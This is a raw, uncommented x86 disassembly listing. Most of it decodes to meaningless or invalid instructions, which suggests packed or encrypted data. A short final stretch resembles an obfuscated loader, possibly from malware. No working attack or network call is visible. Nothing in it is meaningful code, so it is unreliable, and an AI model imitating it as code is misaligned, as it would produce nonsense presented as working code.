  40fb33:	jne    0x40fb55
  40fb35:	pop    edi
  40fb36:	mov    cl,bl
  40fb38:	js     0x40fb82
  40fb3a:	lea    edi,[ebx]
  40fb3c:	(bad)  
  40fb3f:	adc    cl,ah
  40fb41:	gs mov ch,bl
  40fb44:	(bad)  
  40fb45:	xor    eax,DWORD PTR [edx-0x5d91de91]
  40fb4b:	and    BYTE PTR [eax+0x48e8bd53],al
  40fb51:	test   al,0x6
  40fb53:	xor    ebx,edi
  40fb55:	mov    eax,ds:0x6895a02a
  40fb5a:	nop
  40fb5b:	les    ebx,FWORD PTR [edx+esi*2+0x5a]
  40fb5f:	push   DWORD PTR [ebx]
  40fb61:	inc    ebp
  40fb62:	add    al,0xd5
  40fb64:	sti    
  40fb65:	or     esi,edi
  40fb67:	adc    ah,BYTE PTR [ebx]
  40fb69:	xor    al,0x99
  40fb6b:	aas    
  40fb6c:	fst    QWORD PTR [ebp+0x4]
  40fb6f:	mov    eax,ds:0x56e23821
  40fb74:	retf   
  40fb75:	pop    ecx
  40fb76:	popf   
  40fb77:	xor    al,0x5f
  40fb79:	sub    al,0x97
  40fb7b:	inc    ebp
  40fb7c:	or     eax,0x9caaa611
  40fb81:	(bad)  
  40fb82:	mov    eax,0x7a874df8
  40fb87:	or     ecx,DWORD PTR [ebp+0x78789dbe]
  40fb8d:	popa   
  40fb8e:	inc    ebx
  40fb8f:	jmp    0x64eb:0x13dc568d
  40fb96:	sbb    al,BYTE PTR [ebp+edi*4+0xe8c7dc]
  40fb9d:	mov    dh,0xde
  40fb9f:	dec    esi
  40fba0:	xchg   ebp,eax
  40fba1:	mov    edi,0xf979860f
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x11
  40fbc9:	and    dl,BYTE PTR [esi-0x55]
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	add    al,BYTE PTR [eax+ebp*1+0x6c]
  40fbd8:	les    edi,FWORD PTR [eax]
  40fbda:	cmp    al,0xbf
  40fbdc:	cmp    BYTE PTR [ebp-0x621825ae],ch
  40fbe2:	sbb    al,0x31
  40fbe4:	add    eax,0x57aec5f3
  40fbe9:	jmp    0x40fc3f
  40fbeb:	mov    DWORD PTR [ebx],ecx
  40fbed:	dec    edi
  40fbee:	(bad)  [edi+edi*1]
  40fbf1:	inc    ebp
  40fbf2:	in     eax,dx
  40fbf3:	dec    ebx
  40fbf4:	cmp    eax,0xc999f0d6
  40fbf9:	in     eax,dx
  40fbfa:	fisub  WORD PTR [eax]
  40fbfc:	adc    ch,al
  40fbfe:	mov    ds:0x9dd34bba,al
  40fc03:	lock iret 
  40fc05:	popf   
  40fc06:	sub    ah,ah
  40fc08:	pop    es
  40fc09:	mov    BYTE PTR [edx+0x1e7cf7bc],dh
  40fc0f:	jbe    0x40fba1
  40fc11:	ds aaa 
  40fc13:	imul   esi,ebx,0x872cef4b
  40fc19:	add    ebp,DWORD PTR [edx]
  40fc1b:	(bad)  
  40fc1c:	cmp    bl,BYTE PTR [edx]
  40fc1e:	xor    eax,DWORD PTR ds:0x402621ea
  40fc24:	iret   
  40fc25:	and    eax,0x501562d4
  40fc2a:	out    dx,eax
  40fc2b:	xchg   esi,eax
  40fc2c:	dec    esp
  40fc2d:	add    eax,DWORD PTR [edi]
  40fc2f:	inc    eax
  40fc30:	inc    edx
  40fc31:	xor    DWORD PTR [ebp+0x2d339c4],eax
  40fc37:	sub    DWORD PTR [ebx+0x1d],esp
  40fc3a:	push   ebp
  40fc3b:	imul   DWORD PTR ds:0x7ed9c7f
  40fc41:	dec    ebx
  40fc42:	enter  0x5c99,0x5a
  40fc46:	rcr    BYTE PTR [edx],1
  40fc48:	pop    es
  40fc49:	rcl    DWORD PTR ds:0x267f2d02,0x9f
  40fc50:	xor    bl,ch
  40fc52:	sbb    ah,BYTE PTR [esi+0x5]
  40fc55:	ret    
  40fc56:	push   ecx
  40fc57:	sbb    DWORD PTR [ebx-0x53],ecx
  40fc5a:	mov    ah,0x23
  40fc5c:	xchg   esp,eax
  40fc5d:	pop    edx
  40fc5e:	test   eax,0xfcb6b055
  40fc63:	fistp  DWORD PTR [eax]
  40fc65:	cwde   
  40fc66:	inc    ebx
  40fc67:	jne    0x40fcdc
  40fc69:	popa   
  40fc6a:	jbe    0x40fc13
  40fc6c:	shr    bh,cl
  40fc6e:	mov    edi,0xa0ec6f8d
  40fc73:	jb     0x40fc98
  40fc75:	add    esp,DWORD PTR ds:0xbf16b3fd
  40fc7b:	and    ecx,DWORD PTR ds:0x42fed9e3
  40fc81:	jp     0x40fc20
  40fc83:	sub    ecx,esp
  40fc85:	addr16 icebp 
  40fc87:	lock push edx
  40fc89:	xlat   BYTE PTR ds:[ebx]
  40fc8a:	and    BYTE PTR [ebx+0x48],cl
  40fc8d:	not    ah
  40fc8f:	and    eax,0x9fee40b6
  40fc94:	pop    eax
  40fc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc96:	mov    ebx,0xaf418da1
  40fc9b:	xor    al,0x81
  40fc9d:	push   eax
  40fc9e:	loopne 0x40fc6e
  40fca0:	stc    
  40fca1:	shl    DWORD PTR [esi-0x63],1
  40fca4:	sar    BYTE PTR [esi+0x6a8a8c82],cl
  40fcaa:	ins    DWORD PTR es:[edi],dx
  40fcab:	shl    BYTE PTR [edx],1
  40fcad:	inc    ecx
  40fcae:	cld    
  40fcaf:	mov    dh,0xed
  40fcb1:	pop    ds
  40fcb2:	dec    ecx
  40fcb3:	inc    ebx
  40fcb4:	inc    eax
  40fcb5:	jnp    0x40fd17
  40fcb7:	pusha  
  40fcb8:	add    ebx,DWORD PTR [esi-0x27]
  40fcbb:	xor    cl,BYTE PTR [ebx+0x39]
  40fcbe:	mov    ds:0x51270717,al
  40fcc3:	les    ebp,FWORD PTR [ebx+0x2ab8dfe4]
  40fcc9:	sbb    ch,BYTE PTR [ebp-0x5a]
  40fccc:	cld    
  40fccd:	dec    edi
  40fcce:	test   BYTE PTR [eax+ebp*8+0x6a],bh
  40fcd2:	adc    BYTE PTR [edx+0x7ab96a3],bl
  40fcd8:	retf   
  40fcd9:	nop
  40fcda:	adc    BYTE PTR [edx-0x73],bl
  40fcdd:	ret    
  40fcde:	cli    
  40fcdf:	loope  0x40fcc9
  40fce1:	test   eax,0x86bdf07b
  40fce6:	xor    ah,BYTE PTR [edi+eiz*1]
  40fce9:	loope  0x40fd02
  40fceb:	sbb    DWORD PTR [edx],esi
  40fced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcee:	in     al,0xab
  40fcf0:	inc    esi
  40fcf1:	sub    al,0x72
  40fcf3:	retf   
  40fcf4:	inc    eax
  40fcf5:	ret    
  40fcf6:	mov    eax,ds:0x63e8e818
  40fcfb:	into   
  40fcfc:	(bad)  
  40fcfd:	mov    ch,0x8b
  40fcff:	add    DWORD PTR [esi],0x4a
  40fd02:	mov    eax,0xf972ace0
  40fd07:	push   ebx
  40fd08:	out    dx,eax
  40fd09:	pop    esp
  40fd0a:	mov    dl,0x3
  40fd0c:	push   ebx
  40fd0d:	leave  
  40fd0e:	jg     0x40fd27
  40fd10:	dec    ecx
  40fd11:	and    ecx,DWORD PTR [ebx-0x369c8333]
  40fd17:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40fd19:	sbb    eax,0xff5a7765
  40fd1e:	xor    cl,BYTE PTR [esp+edi*4+0x2b227935]
  40fd25:	push   edx
  40fd26:	xchg   edi,eax
  40fd27:	pop    ebp
  40fd28:	pop    edx
  40fd29:	(bad)  
  40fd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd2b:	cld    
  40fd2c:	data16 jns 0x40fcba
  40fd2f:	push   ds
  40fd30:	repz scas eax,DWORD PTR es:[edi]
  40fd32:	dec    ecx
  40fd33:	push   ss
  40fd34:	pop    ecx
  40fd35:	mov    eax,ds:0x32aa7083
  40fd3a:	pop    ebp
  40fd3b:	inc    edx
  40fd3c:	scas   al,BYTE PTR es:[edi]
  40fd3d:	es out 0xb6,al
  40fd40:	ss adc al,0x30
  40fd43:	or     eax,DWORD PTR [esi]
  40fd45:	cwde   
  40fd46:	mov    al,es:0xe9a94368
  40fd4c:	and    esi,ebp
  40fd4e:	mov    ebp,0xd6926442
  40fd53:	shl    BYTE PTR [ecx+0x1e],1
  40fd56:	inc    edi
  40fd57:	pop    esp
  40fd58:	jl     0x40fd94
  40fd5a:	sub    BYTE PTR [edx+0x35],cl
  40fd5d:	sbb    eax,0x6c1212ba
  40fd62:	jle    0x40fdb0
  40fd64:	mov    ds:0x411923bb,eax
  40fd69:	dec    edi
  40fd6a:	rcr    ah,1
  40fd6c:	(bad)  
  40fd6d:	aad    0x30
  40fd6f:	and    DWORD PTR [edi],esi
  40fd71:	dec    ebp
  40fd72:	inc    ebp
  40fd73:	push   edi
  40fd74:	popa   
  40fd75:	mov    ch,0x94
  40fd77:	sbb    esi,edx
  40fd79:	test   eax,0xe9035758
  40fd7e:	cdq    
  40fd7f:	mov    eax,ds:0x807151d6
  40fd84:	jnp    0x40fda1
  40fd86:	mov    edi,DWORD PTR [edi+edx*1]
  40fd89:	jmp    0x40fd26
  40fd8b:	xchg   BYTE PTR [ebp+edi*2-0x6a96c07f],dl
  40fd92:	bound  ecx,QWORD PTR [eax-0x6b]
  40fd95:	in     al,dx
  40fd96:	inc    esi
  40fd97:	popa   
  40fd98:	std    
  40fd99:	pop    esi
  40fd9a:	mov    ds:0xc7bfed04,eax
  40fd9f:	mov    cl,0x88
  40fda1:	cmc    
  40fda2:	push   esi
  40fda3:	mov    ecx,0xbec530ac
  40fda8:	push   ebx
  40fda9:	lds    ebp,FWORD PTR [edx]
  40fdab:	push   edi
  40fdac:	jnp    0x40fd31
  40fdae:	jg     0x40fd5e
  40fdb0:	shl    DWORD PTR ds:0x5f91104b,1
  40fdb6:	lods   al,BYTE PTR ds:[esi]
  40fdb7:	fucom  st(1)
  40fdb9:	in     al,dx
  40fdba:	inc    edi
  40fdbb:	push   ecx
  40fdbc:	mov    es,WORD PTR [eax-0x7cc3c091]
  40fdc2:	xchg   BYTE PTR [esi+0x308d8954],al
  40fdc8:	mov    ch,0x6f
  40fdca:	fisttp WORD PTR [ebx]
  40fdcc:	test   al,0xe4
  40fdce:	adc    BYTE PTR [eax+esi*2],0xc4
  40fdd2:	jo     0x40fdac
  40fdd4:	and    BYTE PTR [edx+0x20],ch
  40fdd7:	mov    ah,0xc5
  40fdd9:	hlt    
  40fdda:	neg    BYTE PTR [esi]
  40fddc:	mov    bl,0xbf
  40fdde:	dec    eax
  40fddf:	xchg   BYTE PTR [ebp+ecx*8-0x10381cac],al
  40fde6:	je     0x40fdb4
  40fde8:	cmp    cl,bl
  40fdea:	xor    BYTE PTR [eax+0x33],ch
  40fded:	test   al,0x8b
  40fdef:	fiadd  WORD PTR [eax+0x2f]
  40fdf2:	push   es
  40fdf3:	add    al,0x96
  40fdf5:	out    0x83,eax
  40fdf7:	sbb    bh,ah
  40fdf9:	lds    ebp,FWORD PTR [edx+0x14]
  40fdfc:	inc    edx
  40fdfd:	and    cl,ch
  40fdff:	sub    eax,0xe27c70e1
  40fe04:	dec    esi
  40fe05:	loop   0x40fe2e
  40fe07:	arpl   sp,di
  40fe09:	(bad)  [eax-0x38]
  40fe0c:	(bad)  
  40fe0d:	int3   
  40fe0e:	pop    ss
  40fe0f:	fidivr DWORD PTR [eax+0x3f310228]
  40fe15:	das    
  40fe16:	pop    edi
  40fe17:	loopne 0x40fdae
  40fe19:	lea    ebx,[ecx-0x48020195]
  40fe1f:	jl     0x40fe0a
  40fe21:	mov    DWORD PTR [eax],ecx
  40fe23:	adc    eax,edx
  40fe25:	xor    BYTE PTR [ebx+0x6934c7e7],al
  40fe2b:	(bad)  
  40fe2c:	jmp    0xda07efbe
  40fe31:	repnz out 0x1d,eax
  40fe34:	imul   edi,DWORD PTR [ebx+ecx*2-0x45024277],0x9
  40fe3c:	add    ch,dl
  40fe3e:	outs   dx,BYTE PTR ds:[esi]
  40fe3f:	mov    dh,0x25
  40fe41:	mov    ebx,0xe287a85c
  40fe46:	in     al,dx
  40fe47:	in     eax,0xce
  40fe49:	push   ss
  40fe4a:	jno    0x40fe07
  40fe4c:	inc    ebp
  40fe4d:	dec    ebp
  40fe4e:	sub    DWORD PTR [ebp-0x7f6ae874],ebp
  40fe54:	cdq    
  40fe55:	mov    esi,0xcb377f5
  40fe5a:	stc    
  40fe5b:	mov    ch,BYTE PTR [esi-0x77]
  40fe5e:	dec    edi
  40fe5f:	repz (bad) 
  40fe61:	sbb    ebp,DWORD PTR [eax]
  40fe63:	add    eax,0x2a2c9b2f
  40fe68:	lock cmp DWORD PTR gs:[eax+0x1928d6a5],esi
  40fe70:	adc    esi,edi
  40fe72:	inc    esp
  40fe73:	icebp  
  40fe74:	push   cs
  40fe75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe76:	cs ja  0x40fe2a
  40fe79:	(bad)  
  40fe7a:	add    al,0xbe
  40fe7c:	xor    al,0xca
  40fe7e:	stos   BYTE PTR es:[edi],al
  40fe7f:	inc    esp
  40fe80:	mov    eax,0x2c828432
  40fe85:	push   esi
  40fe86:	(bad)  
  40fe87:	rcl    BYTE PTR [edx-0x7aa73ece],cl
  40fe8d:	sar    BYTE PTR [edi],cl
  40fe8f:	jecxz  0x40fef3
  40fe91:	stos   BYTE PTR es:[edi],al
  40fe92:	push   es
  40fe93:	dec    ecx
  40fe94:	add    eax,0x849b6b1b
  40fe99:	sbb    al,0x11
  40fe9b:	sahf   
  40fe9c:	pop    edx
  40fe9d:	xor    BYTE PTR [edi],dh
  40fe9f:	push   esi
  40fea0:	lds    eax,FWORD PTR [esi+0x22]
  40fea3:	sub    bh,BYTE PTR [edi-0x8b38325]
  40fea9:	in     eax,dx
  40feaa:	inc    ecx
  40feab:	dec    esp
  40feac:	push   ecx
  40fead:	push   esp
  40feae:	lds    ebx,FWORD PTR [edi+ebx*4-0x6c]
  40feb2:	push   eax
  40feb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feb4:	dec    edx
  40feb5:	fist   DWORD PTR [eax+0x40294c93]
  40febb:	sbb    cl,ch
  40febd:	ret    
  40febe:	jno    0x40fe91
  40fec0:	mov    ebp,0xc8610bdb
  40fec5:	mov    ebx,0xdaa21f04
  40feca:	pop    es
  40fecb:	adc    al,ch
  40fecd:	dec    edx
  40fece:	mov    bl,0x55
  40fed0:	fcom   QWORD PTR [ebx+0x6e]
  40fed3:	sub    ecx,DWORD PTR [edx+0xc458bc3]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x88dd4346
  40fef3:	pop    ds
  40fef4:	push   0x7e7eb5de
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	das    
  40fefe:	fstp   DWORD PTR [edi-0x7b4bfaa7]
  40ff04:	jg     0x40ff12
  40ff06:	sub    al,0x61
  40ff08:	sbb    BYTE PTR [ebp-0x7d],cl
  40ff0b:	mov    al,ds:0x9ad6bceb
  40ff10:	test   DWORD PTR [ebx+0x39c0fd4f],0xc2174f7
  40ff1a:	jecxz  0x40ff15
  40ff1c:	jno    0x40ff26
  40ff1e:	sbb    dh,BYTE PTR [ebp-0x44]
  40ff21:	and    eax,0x8cf21fa0
  40ff26:	ss fs cmc 
  40ff29:	loopne 0x40fee5
  40ff2b:	mov    bl,0x42
  40ff2d:	fld    st(6)
  40ff2f:	or     BYTE PTR [ebp-0x5b],bh
  40ff32:	cwde   
  40ff33:	sbb    bl,ch
  40ff35:	fistp  QWORD PTR fs:[esi-0x26]
  40ff39:	ret    0x2e54
  40ff3c:	jnp    0x40ffb8
  40ff3e:	mov    ds:0xb6b7a5a7,al
  40ff43:	inc    ebp
  40ff44:	loopne 0x40ffb5
  40ff46:	push   cs
  40ff47:	mov    WORD PTR [esi],ds
  40ff49:	lds    ebp,FWORD PTR ds:0x9b972be1
  40ff4f:	add    al,0x44
  40ff51:	data16 xor al,BYTE PTR [ecx-0x245dac31]
  40ff58:	loop   0x40ffbd
  40ff5a:	sbb    ch,dl
  40ff5c:	jne    0x40fee8
  40ff5e:	daa    
  40ff5f:	or     al,0xad
  40ff61:	ficomp WORD PTR [esi+0x39]
  40ff64:	mov    dl,0xd8
  40ff66:	jp     0x40ffcf
  40ff68:	inc    edi
  40ff69:	mov    esp,0x1b3139c8
  40ff6e:	fld    DWORD PTR [ebx-0x503a4c6b]
  40ff74:	stc    
  40ff75:	adc    BYTE PTR [edx-0x66],ch
  40ff78:	les    ebx,FWORD PTR [eax]
  40ff7a:	push   edx
  40ff7b:	push   es
  40ff7c:	call   0x88cf8d61
  40ff81:	popa   
  40ff82:	(bad)  
  40ff83:	aad    0x1a
  40ff85:	out    dx,eax
  40ff86:	icebp  
  40ff87:	stos   BYTE PTR es:[edi],al
  40ff88:	aad    0x27
  40ff8a:	jne    0x40ff26
  40ff8c:	dec    esp
  40ff8d:	ja     0x40ff63
  40ff8f:	out    0x37,eax
  40ff91:	dec    esi
  40ff92:	test   al,0x9
  40ff94:	mov    bl,0xf7
  40ff96:	push   0x3e
  40ff98:	pop    esp
  40ff99:	fisub  DWORD PTR ds:0x33e8b69a
  40ff9f:	cmp    al,0x10
  40ffa1:	nop
  40ffa2:	js     0x410002
  40ffa4:	fisttp QWORD PTR [edi+0x5902711f]
  40ffaa:	dec    ecx
  40ffab:	adc    DWORD PTR [ebx+ebx*1-0x26],0x76
  40ffb0:	fcmovnb st,st(4)
  40ffb2:	pop    ecx
  40ffb3:	adc    BYTE PTR [edi+0x61],al
  40ffb6:	inc    ebx
  40ffb7:	lock or al,0x11
  40ffba:	out    0x7a,al
  40ffbc:	push   eax
  40ffbd:	daa    
  40ffbe:	push   cs
  40ffbf:	cmp    ah,bh
  40ffc1:	pop    edi
  40ffc2:	xchg   esi,eax
  40ffc3:	fstp   QWORD PTR [esi-0x5]
  40ffc6:	inc    esp
  40ffc7:	sbb    DWORD PTR [eax+eiz*8],esp
  40ffca:	call   0x32626e76
  40ffcf:	sbb    al,0xfc
  40ffd1:	push   edi
  40ffd2:	mov    dl,0x2
  40ffd4:	hlt    
  40ffd5:	pop    esp
  40ffd6:	mov    ecx,0xead48a4e
  40ffdb:	sti    
  40ffdc:	and    DWORD PTR [edi+eiz*4],esp
  40ffdf:	retf   
  40ffe0:	sub    al,0x22
  40ffe2:	mov    ebp,0xc6850e5
  40ffe7:	sub    eax,0x992c0287
  40ffec:	fcmove st,st(4)
  40ffee:	xor    eax,esp
  40fff0:	clc    
  40fff1:	adc    ebx,0x75
  40fff4:	(bad)  
  40fff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fff6:	add    eax,0x421310a5
  40fffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fffc:	shl    BYTE PTR [esi],1
  40fffe:	retf   
  40ffff:	jno    0x41004c
  410001:	pop    ebx
  410002:	lods   al,BYTE PTR ds:[esi]
  410003:	dec    eax
  410004:	and    ah,ch
  410006:	ficomp WORD PTR [eax-0x7d]
  410009:	stos   BYTE PTR es:[edi],al
  41000a:	fidiv  WORD PTR [esi]
  41000c:	or     cl,BYTE PTR [eax+0x5f]
  41000f:	xchg   ebp,eax
  410010:	call   0xdd9094ff
  410015:	push   ss
  410016:	cmc    
  410017:	mov    ebx,0xf4c1ba9e
  41001c:	(bad)  
  41001d:	jmp    0x5d09:0xfab491ad
  410024:	rcl    BYTE PTR [esi+0x1],1
  410027:	push   0xc6e33f67
  41002c:	addr16 gs inc edi
  41002f:	jns    0x41005b
  410031:	sub    al,0xab
  410033:	lods   eax,DWORD PTR ds:[esi]
  410034:	jl     0x40ffcd
  410036:	sub    al,0x41
  410038:	inc    ebp
  410039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41003a:	stos   DWORD PTR es:[edi],eax
  41003b:	adc    ch,BYTE PTR [esi+esi*1+0x1e]
  41003f:	mov    bh,0x22
  410041:	mov    BYTE PTR [edi-0x27],ah
  410044:	jne    0x410028
  410046:	aad    0x7b
  410048:	shr    DWORD PTR [ecx],0x88
  41004b:	loop   0x4100a1
  41004d:	lods   eax,DWORD PTR ds:[esi]
  41004e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004f:	into   
  410050:	jno    0x41001c
  410052:	cmp    edx,esp
  410054:	dec    ebp
  410055:	repz shr BYTE PTR [edx+0x14694b97],0x5c
  41005d:	lahf   
  41005e:	push   cs
  41005f:	das    
  410060:	push   0xffffffcc
  410062:	stos   DWORD PTR es:[edi],eax
  410063:	fld    QWORD PTR [ecx]
  410065:	ja     0x410002
  410067:	sahf   
  410068:	fmul   QWORD PTR [ecx+ebp*8+0x48]
  41006c:	in     eax,dx
  41006d:	sbb    eax,0xeddd682
  410072:	outs   dx,DWORD PTR ds:[esi]
  410073:	and    al,0xe9
  410075:	dec    eax
  410076:	xor    edx,0xad0476c7
  41007c:	loopne 0x41003b
  41007e:	je     0x410070
  410080:	add    ah,BYTE PTR [edx-0x52]
  410083:	xchg   esp,eax
  410084:	mov    esp,esp
  410086:	xor    BYTE PTR [eax],ah
  410088:	push   ecx
  410089:	mov    bh,0x33
  41008b:	sub    edx,DWORD PTR [esi-0x2b]
  41008e:	call   0x11cf3631
  410093:	loopne 0x410029
  410095:	pop    edi
  410096:	push   cs
  410097:	pop    ebp
  410098:	xchg   ebp,eax
  410099:	xchg   ebp,eax
  41009a:	daa    
  41009b:	jmp    0x90cb:0x19b555fa
  4100a2:	aad    0xe7
  4100a4:	inc    edi
  4100a5:	fwait
  4100a6:	pop    ebp
  4100a7:	cli    
  4100a8:	add    eax,0x3abe1948
  4100ad:	pop    ss
  4100ae:	or     eax,0xb3abd580
  4100b3:	xor    al,BYTE PTR [ebp+esi*4-0x799c32e8]
  4100ba:	xlat   BYTE PTR ds:[ebx]
  4100bb:	lods   al,BYTE PTR ds:[esi]
  4100bc:	aaa    
  4100bd:	or     BYTE PTR [eax+0x5a],0xd2
  4100c1:	enter  0xefa5,0x98
  4100c5:	ss mov bl,0x2e
  4100c8:	gs and eax,0x9021655e
  4100ce:	sbb    edx,DWORD PTR [ebx+0x36]
  4100d1:	jle    0x410131
  4100d3:	test   bh,bh
  4100d5:	jo     0x410058
  4100d7:	cmp    ebp,DWORD PTR [edi+0x43d13981]
  4100dd:	mov    al,0x12
  4100df:	cmc    
  4100e0:	pop    edi
  4100e1:	js     0x4100d9
  4100e3:	sub    dl,ah
  4100e5:	and    BYTE PTR [ebp+0x47],ch
  4100e8:	mov    cl,0x67
  4100ea:	enter  0x5751,0x50
  4100ee:	push   esp
  4100ef:	dec    esp
  4100f0:	scas   al,BYTE PTR es:[edi]
  4100f1:	and    eax,0xa249cf70
  4100f6:	sub    eax,0x34613fff
  4100fb:	cli    
  4100fc:	dec    ebp
  4100fd:	jb     0x4100f9
  4100ff:	stos   DWORD PTR es:[edi],eax
  410100:	fisubr WORD PTR [ecx-0x5ce45eea]
  410106:	test   DWORD PTR [ecx+0x3af3e73],ebp
  41010c:	fmul   QWORD PTR [edi]
  41010e:	outs   dx,DWORD PTR ds:[esi]
  41010f:	cmp    ah,bl
  410111:	call   0xd685bb02
  410116:	dec    ecx
  410117:	aam    0xb6
  410119:	jno    0x41018a
  41011b:	neg    DWORD PTR [edi-0x5d14ed81]
  410121:	vpsrlq ymm6,ymm2,xmm7
  410125:	cmp    ch,BYTE PTR [ebx+edi*4+0x37]
  410129:	ds xchg ecx,eax
  41012b:	pop    ebx
  41012c:	add    ah,BYTE PTR [ecx]
  41012e:	inc    ebx
  41012f:	out    0xfd,al
  410131:	sub    DWORD PTR [edx+ecx*4],edi
  410134:	popa   
  410135:	sahf   
  410136:	scas   eax,DWORD PTR es:[edi]
  410137:	sub    DWORD PTR [eax],edi
  410139:	iret   
  41013a:	and    DWORD PTR [esp+ebp*8-0x4d],edi
  41013e:	pusha  
  41013f:	jno    0x4100f6
  410141:	mov    edx,0x93f72bde
  410146:	(bad)  
  410147:	push   ds
  410148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410149:	jg     0x410138
  41014b:	aaa    
  41014c:	lock call 0x85677a70
  410152:	leave  
  410153:	nop
  410154:	pop    esi
  410155:	fld    TBYTE PTR [ebx-0x20]
  410158:	push   ss
  410159:	(bad)  
  41015a:	ins    BYTE PTR es:[edi],dx
  41015b:	retf   0x207d
  41015e:	js     0x4101da
  410160:	push   esp
  410161:	xor    DWORD PTR [eax-0x7ceefdc5],ebx
  410167:	mov    ah,0xfd
  410169:	jne    0x4101a0
  41016b:	mov    eax,ds:0xb400bd15
  410170:	daa    
  410171:	retf   
  410172:	push   esp
  410173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410174:	jns    0x4101d0
  410176:	leave  
  410177:	out    dx,eax
  410178:	jmp    0xef9:0x48493965
  41017f:	pusha  
  410180:	ins    BYTE PTR es:[edi],dx
  410181:	(bad)  
  410182:	jb     0x4101af
  410184:	pop    ss
  410185:	xchg   ebp,eax
  410186:	push   ebx
  410187:	(bad)  
  410188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410189:	fst    DWORD PTR [ecx]
  41018b:	xchg   ebx,eax
  41018c:	(bad)  
  41018d:	xchg   ebx,eax
  41018e:	test   BYTE PTR [esi+ebx*4],dh
  410191:	lock mov WORD PTR ds:[esi-0x6e040515],?
  410199:	mov    ah,0x6
  41019b:	fadd   DWORD PTR [edi-0x70]
  41019e:	add    BYTE PTR [ebx+0x3e],ah
  4101a1:	(bad)  
  4101a2:	xchg   ebx,eax
  4101a3:	test   BYTE PTR [eax+0x74],bh
  4101a6:	fcomi  st,st(7)
  4101a8:	xchg   edi,eax
  4101a9:	cmp    DWORD PTR [edx-0x6],edi
  4101ac:	or     DWORD PTR [ebx+0x6f],ebp
  4101af:	mov    al,ds:0x4734c5e2
  4101b4:	push   es
  4101b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101b6:	jo     0x410226
  4101b8:	xchg   BYTE PTR [eax],ah
  4101ba:	stos   DWORD PTR es:[edi],eax
  4101bb:	mov    esp,0x75100ad1
  4101c0:	in     al,0xd8
  4101c2:	mov    edi,0xce8bb4e7
  4101c7:	xor    dl,BYTE PTR [esi]
  4101c9:	or     DWORD PTR [edi+0x2d8e04],ebx
  4101cf:	call   0xb96309eb
  4101d4:	adc    al,0xab
  4101d6:	cdq    
  4101d7:	je     0x41016f
  4101d9:	clc    
  4101da:	push   0x10
  4101dc:	cmc    
  4101dd:	mov    BYTE PTR [edi+ebx*2-0xd],0x73
  4101e2:	jae    0x4101b0
  4101e4:	jmp    0x410215
  4101e6:	push   0xffffffc2
  4101e8:	retf   
  4101e9:	iret   
  4101ea:	push   es
  4101eb:	aas    
  4101ec:	mov    ah,BYTE PTR [eax-0x7b]
  4101ef:	jp     0x4101b1
  4101f1:	leave  
  4101f2:	(bad)  
  4101f3:	or     ebx,ebx
  4101f5:	mov    ds:0xe8cae86e,al
  4101fa:	inc    edi
  4101fb:	push   esi
  4101fc:	and    bl,BYTE PTR [ebx+0x6e]
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
